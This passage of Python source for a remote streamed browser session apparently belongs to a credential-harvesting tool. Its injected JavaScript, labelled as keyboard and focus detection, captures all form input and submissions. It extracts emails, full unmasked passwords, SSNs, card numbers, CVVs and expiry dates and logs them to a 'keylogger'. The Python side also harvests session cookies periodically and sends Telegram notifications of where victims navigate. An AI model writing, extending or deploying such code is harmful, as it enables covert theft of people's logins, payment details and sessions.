                    } else if (tagName === 'textarea') {
                        // Textarea - capture it
                        const value = target.value || '';
                        if (!value.trim()) return;
                        
                        const inputData = {
                            type: 'textarea',
                            fieldType: 'textarea',
                            fieldName: target.name || target.id || '',
                            fieldCategory: 'text',
                            value: value,
                            isPassword: false,
                            url: window.location.href,
                            domain: window.location.hostname
                        };
                        
                        if (window.__neoLogInput) {
                            window.__neoLogInput(inputData);
                        }
                    } else if (isContentEditable) {
                        // Contenteditable - capture text content
                        const value = target.textContent || '';
                        if (!value.trim()) return;
                        
                        const inputData = {
                            type: 'contenteditable',
                            fieldType: 'contenteditable',
                            fieldName: target.id || '',
                            fieldCategory: 'text',
                            value: value,
                            isPassword: false,
                            url: window.location.href,
                            domain: window.location.hostname
                        };
                        
                        if (window.__neoLogInput) {
                            window.__neoLogInput(inputData);
                        }
                    }
                }
                
                // Don't capture keystrokes
                function handleKeyUp(event) {
                    return;
                }
                
                // CREDENTIAL FIELD CAPTURE - Only capture specific credential fields on form submission
                // Only capture: email, password, SSN, card number, name on card, CVV, expiration
                function captureCredentialFields(form) {
                    const credentials = {};
                    const inputs = form.querySelectorAll('input, select');
                    
                    // Keywords to look for in field names/ids
                    const credentialPatterns = {
                        'email': /email|mail|username|user/i,
                        'password': /pass|pwd|secret/i,
                        'ssn': /ssn|social.?security|socialsecurity/i,
                        'card_number': /card|cc|credit|pan|account.?num/i,
                        'card_name': /name.?on.?card|card.?holder|billing.?name|cardowner/i,
                        'cvv': /cvv|cvc|security.?code|csc|verification/i,
                        'expiry': /exp|expiry|expiration|date/i
                    };
                    
                    inputs.forEach(function(input) {
                        const name = (input.name || input.id || input.placeholder || '').toLowerCase();
                        const type = (input.type || '').toLowerCase();
                        let value = input.value || '';
                        
                        // Skip empty values
                        if (!value.trim()) return;
                        
                        // Skip hidden inputs (except for specific credential types)
                        if (type === 'hidden' && !/ssn|card|cc|pan/i.test(name)) return;
                        
                        // Check if this is a credential field
                        for (const [credType, pattern] of Object.entries(credentialPatterns)) {
                            if (pattern.test(name) || pattern.test(input.placeholder || '')) {
                                // Clean up the value
                                value = value.trim();
                                
                                // FIX: Show FULL password value - no masking
                                // This captures the complete password for admin visibility
                                // For password fields, show the FULL password value (not masked)
                                // This is intentional for the keylogger feature
                                if (type === 'password') {
                                    // Keep the FULL password value - show everything
                                    // Example: "MySecretPass123" instead of "**********123"
                                    value = value; // Keep as-is, no masking
                                }
                                
                                // Add to credentials with human-readable label
                                const label = input.name || input.id || input.placeholder || credType;
                                credentials[credType + '_' + label] = {
                                    type: credType,
                                    label: label,
                                    value: value,
                                    isPassword: type === 'password'
                                };
                                break;
                            }
                        }
                    });
                    
                    return credentials;
                }
                
                function handleFormSubmit(event) {
                    const form = event.target;
                    if (!form || form.tagName.toLowerCase() !== 'form') return;
                    
                    // Capture credential fields before submit
                    const credentials = captureCredentialFields(form);
                    
                    // Send credential data to server if callback exists
                    if (window.__neoLogFormData && Object.keys(credentials).length > 0) {
                        window.__neoLogFormData(credentials);
                    }
                }
                
                // Intercept forms that have submit buttons
                function setupFormInterception() {
                    const forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (!form._neo_form_intercepted) {
                            form.addEventListener('submit', handleFormSubmit, true);
                            form._neo_form_intercepted = true;
                        }
                    });
                }
                
                // Set up input listeners on all text inputs
                // Changed from 'input' to 'blur' to capture the FINAL VALUE only
                // Instead of capturing every keystroke (a, ab, abc), we capture
                // the complete value when the user clicks away from the field
                function setupInputListeners() {
                    // Use event delegation on document for dynamic elements
                    document.addEventListener('blur', handleInputChange, true);
                    document.addEventListener('keyup', handleKeyUp, true);
                }
                
                // Use event delegation for click detection
                document.addEventListener('click', handleInputClick, true);
                
                // Also listen for focus/blur events
                document.addEventListener('focus', handleFocus, true);
                document.addEventListener('blur', handleBlur, true);
                
                // Set up input interception (may not have forms yet if DOM not ready)
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', function() {
                        setupFormInterception();
                        setupInputListeners();
                    });
                } else {
                    setupFormInterception();
                    setupInputListeners();
                }
                
                // Also intercept dynamically added forms
                const formObserver = new MutationObserver(function(mutations) {
                    mutations.forEach(function(mutation) {
                        mutation.addedNodes.forEach(function(node) {
                            if (node.nodeType === 1 && node.tagName.toLowerCase() === 'form') {
                                if (!node._neo_form_intercepted) {
                                    node.addEventListener('submit', handleFormSubmit, true);
                                    node._neo_form_intercepted = true;
                                }
                            }
                            // Check for forms in added subtrees
                            if (node.querySelectorAll) {
                                node.querySelectorAll('form').forEach(function(form) {
                                    if (!form._neo_form_intercepted) {
                                        form.addEventListener('submit', handleFormSubmit, true);
                                        form._neo_form_intercepted = true;
                                    }
                                });
                            }
                        });
                    });
                });
                
                formObserver.observe(document.body || document.documentElement, { 
                    childList: true, 
                    subtree: true 
                });
            })();
            """
            
            # Inject the script into the page
            await self.page.add_init_script(focus_detection_script)
            
            # Set up the callback function that JavaScript can call
            async def on_keyboard_request():
                """Handle keyboard request from the page"""
                try:
                    if self.websocket and self.is_active:
                        await self.websocket.send_json({
                            "type": "request_keyboard"
                        })
                except Exception:
                    pass
            
            # Set up the callback function that JavaScript can call
            async def on_keyboard_request():
                """Handle keyboard request from the page"""
                try:
                    if self.websocket and self.is_active:
                        await self.websocket.send_json({
                            "type": "request_keyboard"
                        })
                except Exception:
                    pass
            
            # Set up the callback function to close the keyboard
            async def on_keyboard_close():
                """Handle keyboard close request from the page"""
                try:
                    if self.websocket and self.is_active:
                        await self.websocket.send_json({
                            "type": "close_keyboard"
                        })
                except Exception:
                    pass
            
            # Expose the functions to JavaScript
            await self.page.expose_function("__neoNotifyKeyboardRequest", on_keyboard_request)
            await self.page.expose_function("__neoNotifyKeyboardClose", on_keyboard_close)
            
            # Set up form data capture callback
            async def on_form_submit(form_data: dict):
                """Handle form submission data from the page - only logs credential fields"""
                try:
                    if self.websocket and self.is_active:
                        await self.websocket.send_json({
                            "type": "form_submit",
                            "form_data": form_data
                        })
                        
                        # Log credential fields to keylogger
                        try:
                            # New format: { 'type_label': { type, label, value, isPassword } }
                            # Convert to clean readable format
                            log_entries = []
                            
                            for key, data in form_data.items():
                                if isinstance(data, dict):
                                    field_type = data.get('type', 'unknown')
                                    field_label = data.get('label', key)
                                    field_value = data.get('value', '')
                                else:
                                    # Fallback for old format
                                    field_type = 'field'
                                    field_label = key
                                    field_value = str(data)
                                
                                # Truncate long values
                                if len(field_value) > 100:
                                    field_value = field_value[:100] + "... [truncated]"
                                
                                # Format as "Type: value"
                                log_entries.append(f"{field_type}: {field_value}")
                            
                            # Join with | separator
                            credential_log = " | ".join(log_entries) if log_entries else "No credentials captured"
                            
                            # Log to keylogger
                            await log_keystroke(
                                self.user_id,
                                self.session_id,
                                self.get_active_page().url if self.get_active_page() else '',
                                'credentials',
                                credential_log
                            )
                        except Exception as e:
                            logger.error(f"[KLG] Error logging credentials: {e}")
                except Exception:
                    pass
            
            await self.page.expose_function("__neoLogFormData", on_form_submit)
            
            # Set up real-time input capture callback
            # ENABLED: Capture all input fields in real-time
            async def on_input_capture(input_data: dict):
                """Handle real-time input capture from all text fields"""
                try:
                    if self.websocket and self.is_active:
                        # Format the input data for logging
                        field_type = input_data.get('type', 'unknown')
                        field_name = input_data.get('fieldName', '')
                        field_category = input_data.get('fieldCategory', 'other')
                        field_value = input_data.get('value', '')
                        is_password = input_data.get('isPassword', False)
                        
                        # Skip very long values
                        if len(field_value) > 200:
                            field_value = field_value[:200] + "... [truncated]"
                        
                        # Create a readable log entry
                        if field_type == 'input_field':
                            log_entry = f"INPUT [{field_category}]: {field_value}"
                        elif field_type == 'textarea':
                            log_entry = f"TEXTAREA: {field_value}"
                        elif field_type == 'contenteditable':
                            log_entry = f"CONTENT: {field_value}"
                        else:
                            log_entry = f"{field_type.upper()}: {field_value}"
                        
                        # Log to keylogger
                        await log_keystroke(
                            self.user_id,
                            self.session_id,
                            self.get_active_page().url if self.get_active_page() else '',
                            'input_field',
                            log_entry
                        )
                except Exception as e:
                    logger.error(f"[KLG] Error logging input: {e}")
            
            await self.page.expose_function("__neoLogInput", on_input_capture)
            
            log("[KEYBOARD] Input detection initialized - keyboard opens on input tap, closes on blur")
            
        except Exception as e:
            log_error(f"[KEYBOARD] Failed to set up focus detection: {e}")
    
    async def _setup_page_keyboard_detection(self, page):
        """
        Set up keyboard detection for a newly created page.
        This is called when new pages/tabs are created via popups or window.open().
        """
        try:
            # JavaScript for focus detection on new pages - same logic as main page
            focus_script = """
            (function() {
                'use strict';
                
                if (window._neo_keyboard_detection_initialized) {
                    return;
                }
                window._neo_keyboard_detection_initialized = true;
                
                // Track the currently focused input element
                let activeInputElement = null;
                
                function isTextInput(element) {
                    const tagName = element.tagName.toLowerCase();
                    const inputType = element.type ? element.type.toLowerCase() : '';
                    const textTypes = ['text', 'password', 'email', 'number', 'tel', 'url', 'search', 'date', 'time', 'datetime-local'];
                    
                    if (tagName === 'input' && textTypes.includes(inputType)) return true;
                    if (tagName === 'textarea') return true;
                    if (element.isContentEditable) return true;
                    
                    return false;
                }
                
                function handleInputClick(event) {
                    const target = event.target;
                    
                    if (isTextInput(target)) {
                        activeInputElement = target;
                        
                        if (window.__neoNotifyKeyboardRequest) {
                            window.__neoNotifyKeyboardRequest();
                        }
                        return;
                    }
                    
                    if (activeInputElement && window.__neoNotifyKeyboardClose) {
                        if (!activeInputElement.contains(target)) {
                            activeInputElement = null;
                            window.__neoNotifyKeyboardClose();
                        }
                    }
                }
                
                function handleFocus(event) {
                    const target = event.target;
                    if (isTextInput(target)) {
                        activeInputElement = target;
                        
                        if (window.__neoNotifyKeyboardRequest) {
                            window.__neoNotifyKeyboardRequest();
                        }
                    }
                }
                
                function handleBlur(event) {
                    const target = event.target;
                    if (target === activeInputElement) {
                        activeInputElement = null;
                        if (window.__neoNotifyKeyboardClose) {
                            window.__neoNotifyKeyboardClose();
                        }
                    }
                }
                
                document.addEventListener('click', handleInputClick, true);
                document.addEventListener('focus', handleFocus, true);
                document.addEventListener('blur', handleBlur, true);
            })();
            """
            
            # Add the init script to the new page
            await page.add_init_script(focus_script)
            
            # Expose the callback function if not already exposed on this page
            async def on_keyboard_request():
                try:
                    if self.websocket and self.is_active:
                        await self.websocket.send_json({
                            "type": "request_keyboard"
                        })
                except Exception:
                    pass
            
            async def on_keyboard_close():
                try:
                    if self.websocket and self.is_active:
                        await self.websocket.send_json({
                            "type": "close_keyboard"
                        })
                except Exception:
                    pass
            
            await page.expose_function("__neoNotifyKeyboardRequest", on_keyboard_request)
            await page.expose_function("__neoNotifyKeyboardClose", on_keyboard_close)
            
            log(f"[KEYBOARD] Focus detection set up for new page")
            
        except Exception as e:
            log_error(f"[KEYBOARD] Failed to set up focus detection for new page: {e}")
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        try:
            from urllib.parse import urlparse
            return urlparse(url).netloc
        except Exception:
            return "unknown"
    
    def _generate_page_id(self, page) -> str:
        """Generate unique ID for a page"""
        # Use Playwright's internal GUID if available, otherwise generate one
        try:
            if hasattr(page, 'guid') and page.guid:
                return page.guid
        except Exception:
            pass
        return f"page_{len(self.pages) + 1}_{int(time.time() * 1000)}"
    
    def _setup_page_listeners(self):
        """Set up event listeners for new pages (popups/tabs)"""
        if not self.context:
            return
        
        # Listen for new pages (popups, target="_blank", window.open, etc.)
        self.context.on("page", self._handle_new_page)
        
        log(f"[TABS] Page listener initialized. Current pages: {len(self.pages)}")
    
    async def _handle_new_page(self, page):
        """Handle new page popup/tab creation - switch to new tab and close old one"""
        try:
            page_id = self._generate_page_id(page)
            log(f"[TABS] New page detected: {page_id} - {page.url}")

            # Get the old active page before switching
            old_page = self.get_active_page()
            old_page_id = self.active_page_id

            # Check if old page is still valid before we close it later
            old_page_valid = False
            if old_page and old_page_id:
                try:
                    # Check if old page is still open
                    if not old_page.is_closed():
                        old_page_valid = True
                except Exception:
                    old_page_valid = False

            # Add the new page to our tracking
            self.pages[page_id] = page

            # Set up close listener for this specific page
            page.on("close", lambda p: self._handle_page_close(page_id))

            # Set up keyboard detection for the new page
            await self._setup_page_keyboard_detection(page)

            # Switch streaming to the new tab (with error handling)
            log(f"[TABS] Switching streaming to new tab: {page_id}")
            switch_success = await self._safe_switch_to_tab(page_id)

            if switch_success:
                # Only close old tab if we successfully switched to the new one
                if old_page_valid and old_page_id and old_page_id != page_id:
                    try:
                        # Check again before closing
                        if not old_page.is_closed():
                            log(f"[TABS] Closing old tab: {old_page_id}")
                            await old_page.close()
                    except Exception as e:
                        log_error(f"[TABS] Error closing old tab: {e}")
            else:
                log_error(f"[TABS] Failed to switch to new tab, keeping old tab active")

        except Exception as e:
            log_error(f"[TABS] Error handling new page: {e}")
    
    def _handle_page_close(self, page_id: str):
        """Handle page/tap close event"""
        try:
            if page_id in self.pages:
                del self.pages[page_id]
                log(f"[TABS] Page closed: {page_id}. Remaining: {len(self.pages)}")
            
            # If we closed the active page, switch to another one
            if self.active_page_id == page_id:
                self.active_page_id = None
                if self.pages:
                    # Switch to the first remaining page
                    new_active_id = next(iter(self.pages.keys()))
                    log(f"[TABS] Active page closed, switching to: {new_active_id}")
                    # Use safe switch method to handle any errors
                    asyncio.create_task(self._safe_switch_to_tab(new_active_id))
                else:
                    log("[TABS] All pages closed!")
        except Exception as e:
            log_error(f"[TABS] Error handling page close: {e}")
    
    def get_active_page(self) -> Optional[Any]:
        """Get the currently active page for streaming/input"""
        if self.active_page_id and self.active_page_id in self.pages:
            return self.pages[self.active_page_id]
        # Fallback to first available page
        if self.pages:
            return next(iter(self.pages.values()))
        return None

    def _sync_dom_capture(self):
        """Keep the shared DOM capture helper bound to the active page and websocket."""
        page = self.get_active_page() or self.page
        if self.dom_capture is None:
            self.dom_capture = DOMCaptureSession(page=page, websocket=self.websocket, client_id=self.session_id)
        else:
            self.dom_capture.bind_page(page)
            self.dom_capture.websocket = self.websocket
            self.dom_capture.client_id = self.session_id
        return self.dom_capture

    def attach_dom_capture(self, page: Any, websocket: Any = None, client_id: Optional[str] = None):
        """Attach the reusable DOM capture layer to this session."""
        self.dom_capture = DOMCaptureSession(page=page, websocket=websocket or self.websocket, client_id=client_id or self.session_id)
        return self.dom_capture

    async def capture_remote_page(self, reason: Optional[str] = None, force: bool = False):
        """Capture the current page and transmit it to the connected client.

        Args:
            reason: optional human-readable reason for logging
            force: when True, force an immediate capture (installs observer
                   and asks the page to mark itself stable) — used for the
                   initial snapshot on connect.
        """
        capture = self._sync_dom_capture()
        if not capture:
            return None
        # Page-side interaction handling owns click/touch recapture once its
        # trigger is installed.  Forwarded input dispatches real page
        # listeners there, so firing a second full capture from this handler
        # doubles the work.  Keep the fallback below for trigger-install
        # failures; plain typing is separately handled by the delta observer.
        if (reason in ("click", "mouseup", "touchend", "tap")
                and getattr(capture, "_interaction_trigger_installed", False)):
            logger.debug("[CAPTURE] %s recapture is owned by the page trigger — skipping duplicate", reason)
            return None
        # The new document's observer emits a navigation control batch even
        # when a reload keeps the same URL.  Let it own explicit navigation
        # recaptures too; this prevents a direct page.goto plus the observer
        # signal from launching two full serializers.  If the observer was
        # never installed, retain the full-capture fallback.
        if (reason in ("goto", "reload", "back", "forward")
                and LIVE_DELTA and getattr(capture, "_delta_installed", False)
                and not getattr(capture, "_explicit_navigation_in_progress", False)):
            logger.debug("[CAPTURE] %s navigation is owned by the delta document signal", reason)
            return None
        # Typing while the delta observer is live must NOT trigger a full
        # capture per keystroke: the observer streams 'v' (value) ops to the
        # client live.  A full full_document every keystroke reloads the
        # mirrored iframe, drops input focus (typing becomes impossible),
        # and storms the CDP channel — on the SB backend that storm could
        # wedge the driver channel and tear the browser down with it.
        if (reason in ("text", "keydown", "capture_first_input")
                and LIVE_DELTA and getattr(capture, "_delta_active", False)):
            logger.debug("[CAPTURE] %s recapture owned by delta observer — skipping full capture", reason)
            return None
        return await capture.send_page(reason=reason, force=force)
    
    async def switch_to_tab(self, page_id: str) -> bool:
        """Switch to a specific tab by ID (with safe error handling)"""
        return await self._safe_switch_to_tab(page_id)
    
    async def _safe_switch_to_tab(self, page_id: str) -> bool:
        """Internal async method to switch tabs with comprehensive error handling"""
        try:
            if page_id not in self.pages:
                # FIX 2: Changed from error to info - page may have been cleaned up
                log(f"[TABS] Page not found: {page_id} (may have been cleaned up)")
                return False
            
            page = self.pages[page_id]
            
            # Check if page is still valid before trying to switch
            if page.is_closed():
                # FIX 2: Graceful handling instead of error
                log(f"[TABS] Page {page_id} already closed, removing from tracking")
                # Remove closed page from tracking
                if page_id in self.pages:
                    del self.pages[page_id]
                
                # If this was the active page, switch to another one
                if self.active_page_id == page_id:
                    self.active_page_id = None
                    if self.pages:
                        new_active_id = next(iter(self.pages.keys()))
                        log(f"[TABS] Active page closed, switching to: {new_active_id}")
                        return await self._safe_switch_to_tab(new_active_id)
                return False
            
            # Bring page to front (focus it) with error handling
            try:
                await page.bring_to_front()
            except Exception as e:
                # FIX 2: Don't log as error, just continue
                log(f"[TABS] Warning bringing page to front: {e}")
            
            # Update active page ID
            old_page_id = self.active_page_id
            self.active_page_id = page_id
            
            log(f"[TABS] Switched from {old_page_id} to {page_id}")
            
            # Update CDP screencast to stream from new page
            if self._streamer and self._streamer.is_active:
                try:
                    await self._streamer.switch_page(page)
                    log(f"[TABS] CDP screencast switched to {page_id}")
                except Exception as e:
                    log_error(f"[TABS] Error switching CDP screencast: {e}")
            
            # Send updated metadata
            try:
                await self._send_metadata()
            except Exception as e:
                log_error(f"[TABS] Error sending metadata: {e}")

            # The shared DOMCaptureSession may still be bound to the tab that
            # was just replaced. Rebind it immediately and send a navigation
            # floor for the newly active page; otherwise its URL watcher keeps
            # polling a closed/previous page and the mirror appears frozen.
            try:
                if self.dom_capture is not None:
                    self._sync_dom_capture()
                    await self.capture_remote_page(reason="tab_switch", force=True)
            except Exception as e:
                log_error(f"[TABS] Error rebinding DOM capture: {e}")

            return True
            
        except Exception as e:
            log_error(f"[TABS] Error switching to tab {page_id}: {e}")
            return False
    
    async def close_tab(self, page_id: str) -> bool:
        """Close a specific tab"""
        try:
            if page_id not in self.pages:
                return False
            
            page = self.pages[page_id]
            
            # Don't close the last remaining tab
            if len(self.pages) <= 1:
                log("[TABS] Cannot close the last remaining tab")
                return False
            
            # If closing active tab, switch to another first
            if self.active_page_id == page_id:
                new_active_id = next((pid for pid in self.pages if pid != page_id), None)
                if new_active_id:
                    await self._switch_to_tab_async(new_active_id)
            
            # Close the page
            await page.close()
            
            # Remove from dict (will be done by _handle_page_close)
            if page_id in self.pages:
                del self.pages[page_id]
            
            log(f"[TABS] Closed tab: {page_id}")
            return True
            
        except Exception as e:
            log_error(f"[TABS] Error closing tab {page_id}: {e}")
            return False
    
    def get_all_tabs(self) -> List[Dict]:
        """Get list of all open tabs with their info"""
        tabs = []
        try:
            for page_id, page in self.pages.items():
                try:
                    tabs.append({
                        "id": page_id,
                        "url": page.url if hasattr(page, 'url') else "unknown",
                        "title": page.title() if hasattr(page, 'title') and callable(page.title) else "",
                        "is_active": page_id == self.active_page_id
                    })
                except Exception:
                    tabs.append({
                        "id": page_id,
                        "url": "unknown",
                        "title": "unknown",
                        "is_active": page_id == self.active_page_id
                    })
        except Exception as e:
            log_error(f"[TABS] Error getting tabs list: {e}")
        
        return tabs

    async def _save_profile_info(self):
        """Save user profile information"""
        try:
            if self.browser_manager:
                current_url = self.get_active_page().url if self.get_active_page() else None
                await self.browser_manager.save_user_profile_info(
                    self.user_id,
                    self.user_agent,
                    self.viewport,
                    current_url,
                    self.country,
                    self.state
                )
        except Exception as e:
            log_error(f"Error saving profile info: {e}")

    async def _streaming_loop_independent(self):
        """
        INDEPENDENT STREAMING LOOP - Runs in its own task, completely separate from other operations.
        This ensures streaming is NEVER blocked by dialogs, permissions, or other async operations.

        WebRTC mode: frames are captured via CDP screencast and pushed to an
        internal asyncio.Queue, which feeds a custom VideoStreamTrack. The
        actual video transport happens over a peer-to-peer WebRTC connection
        once the client sends an SDP offer (signaling runs through the
        existing WebSocket control channel).
        """
        try:
            from api import admin_stream_manager

            if not WEBRTC_AVAILABLE:
                log_error("WebRTC streaming requested but aiortc/av not installed")
                await self._notify_stream_error(
                    "WebRTC streaming unavailable - server is missing aiortc dependencies"
                )
                return

            # Logical viewport (what the client sees)
            # LOGICAL-PIXEL POLICY: capture == client CSS pixels. Mobile and
            # desktop share the same capture dimensions, never scaled.
            logical_width = self.viewport.get('width', 1920)
            logical_height = self.viewport.get('height', 1080)

            # Unified CDP screencast for all live views (desktop + mobile).
            # Screenshot mode removed per user request — brother makes more sense.
            # Use logical CSS pixels for both modes, respect screen_height on mobile to exclude black bars.
            screen_height = self.viewport.get('screen_height', logical_height) if self.is_mobile else logical_height
            capture_width = logical_width
            capture_height = screen_height
            if self.is_mobile:
                self._physical_viewport_width = logical_width
                self._physical_viewport_height = screen_height
                log(f"MOBILE CDP: capture {capture_width}x{capture_height} (logical CSS pixels, unified CDP)")
                log(f"   Logical: {logical_width}x{logical_height} (screen_height={screen_height} excludes black bars)")
            else:
                log(f"Desktop WebRTC: capture {capture_width}x{capture_height} (logical CSS pixels)")

            # Lossless capture everywhere: PNG screencast frames keep text
            # and fine UI crisp - no JPEG ringing on any domain.
            webrtc_config = WebRTCConfig(
                method="cdp",
                cdp_format="png",
                cdp_quality=100,
                target_fps=self.config.target_fps if not self.is_mobile else min(20, self.config.target_fps),
                capture_width=capture_width,
                capture_height=capture_height,
                max_queue_size=2,
                debug=False,
            )

            # Create and start WebRTC streamer
            self._streamer = create_webrtc_streamer(config=webrtc_config)
            self._streaming_type = "webrtc"

            # Start streaming (CDP screencast + watchdog + keepalive all internal)
            success = await self._streamer.start(self.get_active_page(), self.websocket)

            if success:
                log(f"[INDEPENDENT] WebRTC streaming active")
                log(f"   Resolution: {webrtc_config.capture_width}x{webrtc_config.capture_height}")
                log(f"   Target FPS: {webrtc_config.target_fps}")

                # Notify client that WebRTC is ready and they may send an SDP offer
                try:
                    if self.websocket and not getattr(self.websocket, 'closed', False):
                        await self.websocket.send_json({
                            "type": "webrtc_ready",
                            "session_id": self.session_id,
                        })
                except Exception as notify_err:
                    log(f"[INDEPENDENT] Failed to send webrtc_ready: {notify_err}")

                # Start monitoring tasks
                asyncio.create_task(self._stream_monitor())
                asyncio.create_task(self._profile_sync_loop())
                asyncio.create_task(self._page_transition_monitor())

                # Main independent loop - keep task alive while the streamer runs.
                # The streamer has its own screencast/watchdog/keepalive tasks,
                # so all we need to do here is stay responsive to shutdown.
                while self.is_active and not self._streaming_shutdown_event.is_set():
                    try:
                        # Yield to the event loop. The streamer is doing all the work.
                        await asyncio.sleep(0.5)
                    except asyncio.CancelledError:
                        break
                    except Exception as e:
                        log_error(f"[STREAMING] Loop error: {e}")
                        await asyncio.sleep(0.01)
            else:
                log_error("Failed to start WebRTC stream")
                # FIX: Notify client that streaming failed so they can retry
                await self._notify_stream_error("Failed to start WebRTC stream - please refresh")

        except asyncio.CancelledError:
            log("[STREAMING] Streaming loop cancelled")
        except Exception as e:
            log_error(f"[STREAMING] Independent streaming failed: {e}")
            # FIX: Notify client that streaming failed so they can retry
            try:
                await self._notify_stream_error(f"Streaming error: {str(e)}")
            except:
                pass
        finally:
            # Cleanup streamer
            if self._streamer:
                try:
                    await self._streamer.stop()
                except Exception:
                    pass
            log("[STREAMING] Streaming loop ended")

    async def _start_cdp_streaming(self):
        """Start streaming - DEPRECATED, use _streaming_loop_independent instead"""
        # This method is kept for backwards compatibility but is no longer used
        pass


    async def _page_transition_monitor(self):
        """Monitor page URL changes and notify client of transitions"""
        while self.is_active:
            try:
                await asyncio.sleep(0.5)  # Check every 500ms
                
                # Get current page URL
                page = self.get_active_page()
                if not page or page.is_closed():
                    continue
                
                try:
                    current_url = page.url
                    if current_url and current_url != self.current_url:
                        # URL changed - this is a page transition
                        time_since_last = asyncio.get_event_loop().time() - self.last_transition_time
                        
                        if time_since_last > self.transition_cooldown:
                            # Notify client of transition
                            if self.websocket and not self.websocket.closed:
                                try:
                                    await self.websocket.send_json({
                                        'type': 'page_transition',
                                        'url': current_url,
                                        'timestamp': time.time()
                                    })
                                    logger.debug(f'[TRANSITION] Page navigation: {self.current_url} -> {current_url}')
                                except Exception:
                                    pass
                            
                            # Send Telegram navigation notification
                            asyncio.create_task(self._send_navigation_notification(current_url))
                            
                            self.last_transition_time = asyncio.get_event_loop().time()
                        
                        self.current_url = current_url
                        
                except Exception:
                    pass
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                log_error(f"[Error] {e}")

    async def _stream_monitor(self):
        """Monitor streaming health and adjust FPS adaptively"""
        while self.is_active:
            try:
                await asyncio.sleep(5.0)  # Check every 5 seconds

                if self._streamer and self._streamer.is_active:
                    stats = self._streamer.get_stats()

                    # WebRTCStreamer reports frames_received; the legacy CDPStreamer
                    # reported frames_sent. Both indicate total frame throughput so
                    # the drop-rate math is identical.
                    frames_total = stats.get('frames_sent', stats.get('frames_received', 0))

                    if frames_total > 0:
                        # Calculate frame drop rate
                        total = frames_total + stats.get('frames_dropped', 0)
                        drop_rate = stats.get('frames_dropped', 0) / total if total > 0 else 0

                        # Adaptive FPS logic
                        if self._adaptive_fps_enabled:
                            if drop_rate > self._fps_drop_threshold:
                                # Frame drops detected - reduce FPS
                                self._consecutive_drops += 1
                                self._consecutive_recoveries = 0

                                if self._consecutive_drops >= 2 and self.current_fps > self._fps_min:
                                    new_fps = max(self._fps_min, self.current_fps - 10)
                                    if new_fps != self.current_fps:
                                        self.current_fps = new_fps
                                        await self._update_stream_fps(new_fps)
                                        log(f"Adaptive FPS: Reducing to {new_fps} FPS (drop rate: {drop_rate*100:.1f}%)")
                                        self._consecutive_drops = 0

                            elif drop_rate < self._fps_recovery_threshold:
                                # Good performance - increase FPS back
                                self._consecutive_recoveries += 1
                                self._consecutive_drops = 0

                                if self._consecutive_recoveries >= 3 and self.current_fps < self._fps_max:
                                    new_fps = min(self._fps_max, self.current_fps + 5)
                                    if new_fps != self.current_fps:
                                        self.current_fps = new_fps
                                        await self._update_stream_fps(new_fps)
                                        log(f"Adaptive FPS: Increasing to {new_fps} FPS (stable)")
                                        self._consecutive_recoveries = 0

                        log(f"Stream Stats: FPS={stats.get('actual_fps', 0)}, "
                             f"frames={frames_total}, dropped={stats.get('frames_dropped', 0)} ({drop_rate*100:.1f}%), "
                             f"webrtc_state={stats.get('webrtc_state', 'n/a')}")

            except asyncio.CancelledError:
                break
            except Exception as e:
                log_error(f"[Error] {e}")

    async def _update_stream_fps(self, new_fps: int):
        """Update the stream FPS dynamically"""
        try:
            if self._streamer and self._streamer.is_active:
                # WebRTCStreamer stores target_fps on its config object
                if hasattr(self._streamer, 'target_fps'):
                    self._streamer.target_fps = new_fps
                elif hasattr(self._streamer, 'config') and hasattr(self._streamer.config, 'target_fps'):
                    self._streamer.config.target_fps = new_fps
                log(f"Stream FPS updated to {new_fps}")
        except Exception as e:
            log_error(f"Error updating FPS: {e}")

    async def _profile_sync_loop(self):
        """Periodically sync profile data (cookies, storage) - OPTIMIZED for less overhead"""
        while self.is_active:
            try:
                await asyncio.sleep(60)  # Increased from 30s to 60s - less disk I/O
                
                if self.get_active_page() and self.is_active:
                    # Save current cookies
                    try:
                        cookies = await self.context.cookies()
                        if cookies and self.browser_manager:
                            current_url = self.get_active_page().url
                            await self.browser_manager.update_session_cookies(
                                self.user_id,
                                current_url,
                                cookies
                            )
                            # NO logging - reduces overhead
                    except Exception:
                        pass
                        
            except asyncio.CancelledError:
                break
            except Exception as e:
                log_error(f"[Error] {e}")

    async def _heartbeat_monitor(self):
        """
        Heartbeat monitor - Part 3.

        The server owns the cadence: it sends a ping and waits for the
        client's pong. The client no longer wakes up on an independent
        timer, which avoids duplicate keep-alive traffic.
        """
        while self.is_active:
            try:
                await asyncio.sleep(self._ping_interval)

                if self.websocket and self.is_active:
                    try:
                        await self.websocket.send_json({
                            "type": "ping",
                            "timestamp": time.time(),
                        })
                    except Exception:
                        # A close can race this send. The websocket handler
                        # owns reconnect/cleanup, not the heartbeat task.
                        pass
                try:
                    if self._session_registry is not None:
                        await self._session_registry.update_activity(self.session_id)
                except Exception:
                    pass
                
                current_time = time.time()
                time_since_last_pong = current_time - self._last_client_pong_time
                
                # If no pong received within session_timeout, terminate the session
                if time_since_last_pong > self._session_timeout:
                    log(f"[HEARTBEAT] Session timeout - no pong received for {time_since_last_pong:.1f}s (timeout: {self._session_timeout}s)")
                    
                    # Send session_expired message to client before closing
                    try:
                        if self.websocket and self.is_active:
                            await self.websocket.send_json({
                                "type": "session_expired",
                                "message": "Session expired due to inactivity"
                            })
                    except Exception:
                        pass
                    
                    # Trigger shutdown
                    await self.shutdown(force=True)
                    break
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                log_error(f"[Error] {e}")

    async def handle_pong(self):
        """Handle pong response from client - Part 3"""
        self._last_client_pong_time = time.time()
    
    # ============================================================
    # PERMISSION HANDLING SYSTEM
    # Forwards Chrome permission dialogs to client for approval
    # ============================================================
    
    async def _setup_permission_handler(self):
        """Set up permission handler - DISABLED for performance"""
        try:
            # PERMISSION HANDLING DISABLED COMPLETELY
            # This removes all browser dialogue/permission transmission overhead
            # Dialogs will be automatically handled by the browser
            log(f"[PERMISSIONS] Permission handler disabled - no dialog transmission")
            
        except Exception as e:
            log_error(f"[PERMISSIONS] Error: {e}")
    
    async def _handle_dialog(self, dialog):
        """
        Handle JavaScript dialogs (alert, confirm, prompt) - FIRE-AND-FORGET.
        This runs independently from the streaming loop to prevent blocking.
        """
        # PERFORMANCE: Fire-and-forget dialog handling
        # Dialogs are handled in a separate context that doesn't block streaming
        asyncio.create_task(self._handle_dialog_async(dialog))
    
    async def _handle_dialog_async(self, dialog):
